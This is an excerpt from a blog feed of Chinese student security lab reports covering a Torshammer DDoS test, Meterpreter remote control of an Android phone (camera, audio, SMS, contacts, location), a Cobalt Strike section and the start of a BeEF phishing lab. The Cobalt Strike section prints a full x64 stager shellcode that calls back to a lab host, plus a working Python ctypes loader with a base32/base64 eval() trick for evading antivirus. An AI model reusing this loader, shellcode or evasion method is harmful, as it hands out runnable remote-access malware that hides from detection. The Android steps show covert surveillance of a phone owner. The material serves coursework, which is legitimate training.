<h2 id="打开-Acunetix，添加目标"><a href="#打开-Acunetix，添加目标" class="headerlink" title="打开 Acunetix，添加目标"></a>打开 Acunetix，添加目标</h2><h3 id="查看本机地址"><a href="#查看本机地址" class="headerlink" title="查看本机地址"></a>查看本机地址</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112414246.png"
                      alt="image-20240508112414246"
                ></p>
<h3 id="添加目标"><a href="#添加目标" class="headerlink" title="添加目标"></a>添加目标</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112432796.png"
                      alt="image-20240508112432796"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112442492.png"
                      alt="image-20240508112442492"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112448954.png"
                      alt="image-20240508112448954"
                ></p>
<h3 id="开始扫描"><a href="#开始扫描" class="headerlink" title="开始扫描"></a>开始扫描</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112508096.png"
                      alt="image-20240508112508096"
                ></p>
<h3 id="扫描结果出现威胁"><a href="#扫描结果出现威胁" class="headerlink" title="扫描结果出现威胁"></a>扫描结果出现威胁</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112524274.png"
                      alt="image-20240508112524274"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112538830.png"
                      alt="image-20240508112538830"
                ></p>
<h3 id="导出漏扫报告"><a href="#导出漏扫报告" class="headerlink" title="导出漏扫报告"></a>导出漏扫报告</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112611453.png"
                      alt="image-20240508112611453"
                ></p>
<h2 id="攻击机安装-Python"><a href="#攻击机安装-Python" class="headerlink" title="攻击机安装 Python"></a>攻击机安装 Python</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508112656720.png"
                      alt="image-20240508112656720"
                ></p>
<h3 id="利用-Torshammer-攻击"><a href="#利用-Torshammer-攻击" class="headerlink" title="利用 Torshammer 攻击"></a>利用 Torshammer 攻击</h3><h4 id="安装-Torshammer"><a href="#安装-Torshammer" class="headerlink" title="安装 Torshammer"></a>安装 Torshammer</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508113129539.png"
                      alt="image-20240508113129539"
                ></p>
<h4 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/CyberSecurity/7-DDoS/image-20240508113155410.png"
                      alt="image-20240508113155410"
                ></p>
<blockquote>
<p>此时，在地址栏输入目标网站地址，已无法对该网站进行正常访问</p>
<p>停止 torshammer.py 攻击进程后，即可恢复目标网站的正常访问关闭 cmd 命令窗口后，出现界面</p>
</blockquote>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>网络安全</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>QFNU</tag>
        <tag>网络安全原理实验报告</tag>
        <tag>DDoS攻击</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实训10——Kali远程控制Android系统</title>
    <url>/posts/d1743c61.html</url>
    <content><![CDATA[<h2 id="查看-Metasploit-工具中可以在-Android-系统下使用的-payload-类型"><a href="#查看-Metasploit-工具中可以在-Android-系统下使用的-payload-类型" class="headerlink" title="查看 Metasploit 工具中可以在 Android 系统下使用的 payload 类型"></a>查看 Metasploit 工具中可以在 Android 系统下使用的 payload 类型</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716080804249.png"
                      alt="image-20240716080804249"
                ></p>
<ul>
<li>这些 payload 可以作为我们后面攻击的软件的生成工具</li>
</ul>
<h2 id="端口映射问题"><a href="#端口映射问题" class="headerlink" title="端口映射问题"></a>端口映射问题</h2><ul>
<li><p>如果我们的手机与使用的计算机处在同一局域网，但是虚拟机使用的是 NAT 模式。那么只有我们使用的计算机才可以访问到该虚拟机，其他设备都是无法访问该虚拟机的。那么就需要端口映射了</p>
</li>
<li><p>假设计算机的 IP 为（192.168.1.100）。Android 手机的 IP 为（192.168.1.*）。虚拟机的 IP 为（192.168.169.130）：</p>
</li>
<li><p>第一步：打开 VMware 虚拟机网络编辑器</p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716081134183.png"
                      alt="image-20240716081134183"
                ></p>
<ul>
<li>第二步：设置端口的映射（设置之后，凡是发往计算机 9999 端口的流量都会转发到虚拟机的 9999 端口上，这样虚拟机就能够接收到 Android 的连接了）</li>
</ul>
<h2 id="远程控制-Android-手机演示"><a href="#远程控制-Android-手机演示" class="headerlink" title="远程控制 Android 手机演示"></a>远程控制 Android 手机演示</h2><ul>
<li>本案例中，Linux 采用桥接模式，与 Android 手机连接在同一局域网中</li>
</ul>
<h3 id="使用-msfvenom-命令生成被控端-payload"><a href="#使用-msfvenom-命令生成被控端-payload" class="headerlink" title="使用 msfvenom 命令生成被控端 payload"></a>使用 msfvenom 命令生成被控端 payload</h3><ul>
<li>第一步：下面我以“android&#x2F;meterpreter&#x2F;reverse_tcp”类型的 payload 为例，然后查看该类型需要的参数（图片显示需要 IP 和端口）</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716081544495.png"
                      alt="image-20240716081544495"
                ></p>
<ul>
<li><p>查看完参数之后，退出 Metasploit</p>
</li>
<li><p>第二步：生成 payload（msfvenom 命令中默认没有 apk 这种格式的文件。此处使用 R 来替代-f 和-o）</p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716082433269.png"
                      alt="image-20240716082433269"
                ></p>
<h3 id="为软件签名"><a href="#为软件签名" class="headerlink" title="为软件签名"></a>为软件签名</h3><ul>
<li>第一步：使用 keytool 生成一个 key 文件。会让你输入该 key 的名称、单位、地址等等信息，最终生成一个 key 文件</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716083005825.png"
                      alt="image-20240716083005825"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716083612843.png"
                      alt="image-20240716083612843"
                ></p>
<p>未找到命令</p>
<p>安装一下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">apt-get upgrade</span><br><span class="line"></span><br><span class="line">apt-get install openjdk-11-jdk-headless</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716083910153.png"
                      alt="image-20240716083910153"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716084431577.png"
                      alt="image-20240716084431577"
                ></p>
<h3 id="开启主动端，等待被控端连接"><a href="#开启主动端，等待被控端连接" class="headerlink" title="开启主动端，等待被控端连接"></a>开启主动端，等待被控端连接</h3><p>使用msfconsole开启Metasploit</p>
<p>主动端使用handler</p>
<p>为handler设置参数（payload版本类型、IP地址、端口）</p>
<p>开启监听（等待被控端接入）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716091252555.png"
                      alt="image-20240716091252555"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716092343553.png"
                      alt="image-20240716092343553"
                ></p>
<h4 id="远程控制Android手机拍照"><a href="#远程控制Android手机拍照" class="headerlink" title="远程控制Android手机拍照"></a>远程控制Android手机拍照</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716092511699.png"
                      alt="image-20240716092511699"
                ></p>
<h4 id="远程控制Android手机录视频"><a href="#远程控制Android手机录视频" class="headerlink" title="远程控制Android手机录视频"></a>远程控制Android手机录视频</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716092554977.png"
                      alt="image-20240716092554977"
                ></p>
<h4 id="远程控制Android手机录音"><a href="#远程控制Android手机录音" class="headerlink" title="远程控制Android手机录音"></a>远程控制Android手机录音</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716092631540.png"
                      alt="image-20240716092631540"
                ></p>
<h4 id="查看Android手机是否已经执行root权限"><a href="#查看Android手机是否已经执行root权限" class="headerlink" title="查看Android手机是否已经执行root权限"></a>查看Android手机是否已经执行root权限</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716092650787.png"
                      alt="image-20240716092650787"
                ></p>
<h4 id="导出Android手机的电话本"><a href="#导出Android手机的电话本" class="headerlink" title="导出Android手机的电话本"></a>导出Android手机的电话本</h4><p>我的模拟器没有联系人所以没有</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716092721510.png"
                      alt="image-20240716092721510"
                ></p>
<h4 id="导出Android手机的短信记录"><a href="#导出Android手机的短信记录" class="headerlink" title="导出Android手机的短信记录"></a>导出Android手机的短信记录</h4><p>同上</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716092749806.png"
                      alt="image-20240716092749806"
                ></p>
<h4 id="远程控制目标手机发送短信"><a href="#远程控制目标手机发送短信" class="headerlink" title="远程控制目标手机发送短信"></a>远程控制目标手机发送短信</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716092846387.png"
                      alt="image-20240716092846387"
                ></p>
<h4 id="对目标手机进行定位，查看目标手机位置信息"><a href="#对目标手机进行定位，查看目标手机位置信息" class="headerlink" title="对目标手机进行定位，查看目标手机位置信息"></a>对目标手机进行定位，查看目标手机位置信息</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/10/image-20240716092949791.png"
                      alt="image-20240716092949791"
                ></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实训</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>网络安全实训</tag>
        <tag>Kali</tag>
        <tag>Android</tag>
        <tag>远程控制</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实训11——Pyinstaller打包逆向分析火绒免杀</title>
    <url>/posts/211bc68b.html</url>
    <content><![CDATA[<h2 id="cs-shellcode"><a href="#cs-shellcode" class="headerlink" title="cs shellcode"></a>cs shellcode</h2><p>打开</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/11/image-20240716144812645.png"
                      alt="image-20240716144812645"
                ></p>
<p>查看生成的 payload</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># length: 894 bytes</span><br><span class="line">buf = &quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\xff\xff\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x54\x46\x4e\x75\x00\xaa\x70\x9b\x7f\x7e\xe2\x64\x6f\xcc\x10\x1b\x90\x61\x03\x39\x80\xc8\xa5\x0d\x12\x17\x65\xdb\x19\x76\x54\xe5\xc9\xad\xb7\xfd\xd9\x13\x72\x8a\xdd\x13\xc9\xc1\x62\x89\xeb\xe4\x0a\xb6\xcc\xc3\x4d\x97\xf0\xc4\xd2\x8a\x1a\x4c\x52\x5c\x04\xb1\xaa\xc5\x42\xaf\x31\xef\x1e\xb7\x0a\xf5\xd3\xea\x7a\x58\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x35\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x3b\x20\x44\x69\x67\x45\x78\x74\x3b\x20\x44\x54\x53\x20\x41\x67\x65\x6e\x74\x0d\x0a\x00\x12\xfb\x77\xa2\x83\x3b\xab\x20\x14\xd0\xde\x97\xd9\x52\xe5\x7d\x73\xb4\xab\x85\xba\x6e\xd4\xca\xdc\xce\x99\x2b\xd7\x24\xfa\x5f\x68\x01\x8f\x5d\xbc\x23\x11\x8d\x31\x7e\x54\x6f\x0e\xe6\x07\xe7\x6a\x34\x3a\xce\x13\x09\xa1\xc4\xe0\x28\xde\xaf\x4e\xf5\xa8\x0f\x01\xe7\x48\x8f\x23\x42\x4c\xd6\x08\x08\x01\xfa\x3e\x7d\x48\xef\x29\x1b\x72\xf3\x70\x01\xdd\x6d\x9c\x64\x5b\x51\x66\xef\x59\x59\x9d\xba\x70\xf4\x03\xa4\xad\x9d\x2d\xe2\x57\xcb\x89\x36\x26\x70\x67\xd7\x17\x48\x10\xf5\x34\x28\x37\x89\xe5\xc6\xc2\xf5\x3d\x75\x9a\xc7\x0b\xaf\xac\xa6\xea\xc4\x9f\x18\x25\x79\x68\x88\x59\x41\x6e\x22\x18\x63\x52\xf8\xca\x55\x6b\xf4\x77\xa2\x77\xb1\x18\x68\xd6\xb0\xd8\xfc\xdf\x7d\x5d\xbc\x14\x09\x56\x98\xc9\x70\x82\x40\x05\xf5\x84\xf4\x86\x0d\xf0\x6e\x52\x85\xa9\x0a\x8f\xbc\x22\x82\xb9\x25\xbf\x70\x90\x96\xb2\xb7\x63\xc4\xba\x85\x97\x4f\xca\x8d\x92\xec\x07\xa7\xbb\xbd\xe7\x1f\x83\xe7\xc7\x5c\x1f\x08\x0b\xad\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x38\x39\x2e\x31\x33\x30\x00\x12\x34\x56\x78&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>直接运行，cs 直接上线</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/11/image-20240716145123361.png"
                      alt="image-20240716145123361"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/11/image-20240716145157292.png"
                      alt="image-20240716145157292"
                ></p>
<h2 id="shellcode-免杀"><a href="#shellcode-免杀" class="headerlink" title="shellcode 免杀"></a>shellcode 免杀</h2><p>这里采用 base32+base64 编码进行免杀</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line"># Time : 2021/04/29 11:19:04</span><br><span class="line"># Author: crow</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import ctypes</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">shellcode = b&quot;&quot;</span><br><span class="line"># length: 894 bytes</span><br><span class="line">shellcode = b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\xff\xff\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x54\x46\x4e\x75\x00\xaa\x70\x9b\x7f\x7e\xe2\x64\x6f\xcc\x10\x1b\x90\x61\x03\x39\x80\xc8\xa5\x0d\x12\x17\x65\xdb\x19\x76\x54\xe5\xc9\xad\xb7\xfd\xd9\x13\x72\x8a\xdd\x13\xc9\xc1\x62\x89\xeb\xe4\x0a\xb6\xcc\xc3\x4d\x97\xf0\xc4\xd2\x8a\x1a\x4c\x52\x5c\x04\xb1\xaa\xc5\x42\xaf\x31\xef\x1e\xb7\x0a\xf5\xd3\xea\x7a\x58\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x35\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x3b\x20\x44\x69\x67\x45\x78\x74\x3b\x20\x44\x54\x53\x20\x41\x67\x65\x6e\x74\x0d\x0a\x00\x12\xfb\x77\xa2\x83\x3b\xab\x20\x14\xd0\xde\x97\xd9\x52\xe5\x7d\x73\xb4\xab\x85\xba\x6e\xd4\xca\xdc\xce\x99\x2b\xd7\x24\xfa\x5f\x68\x01\x8f\x5d\xbc\x23\x11\x8d\x31\x7e\x54\x6f\x0e\xe6\x07\xe7\x6a\x34\x3a\xce\x13\x09\xa1\xc4\xe0\x28\xde\xaf\x4e\xf5\xa8\x0f\x01\xe7\x48\x8f\x23\x42\x4c\xd6\x08\x08\x01\xfa\x3e\x7d\x48\xef\x29\x1b\x72\xf3\x70\x01\xdd\x6d\x9c\x64\x5b\x51\x66\xef\x59\x59\x9d\xba\x70\xf4\x03\xa4\xad\x9d\x2d\xe2\x57\xcb\x89\x36\x26\x70\x67\xd7\x17\x48\x10\xf5\x34\x28\x37\x89\xe5\xc6\xc2\xf5\x3d\x75\x9a\xc7\x0b\xaf\xac\xa6\xea\xc4\x9f\x18\x25\x79\x68\x88\x59\x41\x6e\x22\x18\x63\x52\xf8\xca\x55\x6b\xf4\x77\xa2\x77\xb1\x18\x68\xd6\xb0\xd8\xfc\xdf\x7d\x5d\xbc\x14\x09\x56\x98\xc9\x70\x82\x40\x05\xf5\x84\xf4\x86\x0d\xf0\x6e\x52\x85\xa9\x0a\x8f\xbc\x22\x82\xb9\x25\xbf\x70\x90\x96\xb2\xb7\x63\xc4\xba\x85\x97\x4f\xca\x8d\x92\xec\x07\xa7\xbb\xbd\xe7\x1f\x83\xe7\xc7\x5c\x1f\x08\x0b\xad\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x38\x39\x2e\x31\x33\x30\x00\x12\x34\x56\x78&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = bytearray(shellcode)</span><br><span class="line"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"># 申请内存</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(</span><br><span class="line">    ctypes.c_int(0),</span><br><span class="line">    ctypes.c_int(len(shellcode)),</span><br><span class="line">    ctypes.c_int(0x3000),</span><br><span class="line">    ctypes.c_int(0x40),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 放入shellcode</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">string = &quot;LEZVENLDI5LHUTDOMRYGE3KSONREGNLSLJMEU5K2K53XUTLJGVJWIR3YJZRDGWTMKRLVM5DCGNFDKS2HJYYGKWCCNRRXSNLKLAZVM4DCNZITETSDNB3WISCJOBGEGQTJMRLVS42JI5HDAZKYIJWGG6JVNJMDE3DVMRBWQ422K42G6YZSNBWGER3YNJRDEUTMJNJWW4A=&quot;</span><br><span class="line"></span><br><span class="line">eval(base64.b64decode(base64.b32decode(string)))</span><br><span class="line"></span><br><span class="line"># 创建一个线程从shellcode防止位置首地址开始执行</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(0),</span><br><span class="line">    ctypes.c_int(0),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(0),</span><br><span class="line">    ctypes.c_int(0),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(0)),</span><br><span class="line">)</span><br><span class="line"># 等待上面创建的线程运行完</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>尝试使用 pyminifier 混淆</p>
<p><a class="link"   href="https://github.com/liftoff/pyminifier" >liftoff&#x2F;pyminifier: Pyminifier is a Python code minifier, obfuscator, and compressor. (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>但是这个是 Python2 的环境，我所有环境都是 Python3，失败告终</p>
<p>看了一眼兵哥的实验报告</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/11/image-20240716154238149.png"
                      alt="image-20240716154238149"
                ></p>
<p>免杀成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/11/image-20240716154328958.png"
                      alt="image-20240716154328958"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/11/image-20240716154317052.png"
                      alt="image-20240716154317052"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/11/image-20240716154504032.png"
                      alt="image-20240716154504032"
                ></p>
<p>上线</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实训</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>网络安全实训</tag>
        <tag>Kali</tag>
        <tag>Pyinstaller</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实训1——网络钓鱼攻击</title>
    <url>/posts/1536eb66.html</url>
    <content><![CDATA[<h1 id="网络钓鱼攻击"><a href="#网络钓鱼攻击" class="headerlink" title="网络钓鱼攻击"></a>网络钓鱼攻击</h1><blockquote>
<p>可能需要的：<a href="https://blog.w1ndys.top/posts/3073af94">kali Linux 切换镜像源</a></p>
</blockquote>
<h2 id="安装并启动"><a href="#安装并启动" class="headerlink" title="安装并启动"></a>安装并启动</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/1/image-20240711083230622.png"
                      alt="image-20240711083230622"
                ></p>
<h2 id="利用-BeEF-进行网页钓鱼攻击"><a href="#利用-BeEF-进行网页钓鱼攻击" class="headerlink" title="利用 BeEF 进行网页钓鱼攻击"></a>利用 BeEF 进行网页钓鱼攻击</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/1/image-20240711084432017.png"
                      alt="image-20240711084432017"
                ></p>
<h2 id="利用-nodejs-开启静态服务"><a href="#利用-nodejs-开启静态服务" class="headerlink" title="利用 nodejs 开启静态服务"></a>利用 nodejs 开启静态服务</h2><blockquote>
<p>补充利用 nodejs 开启静态服务</p>
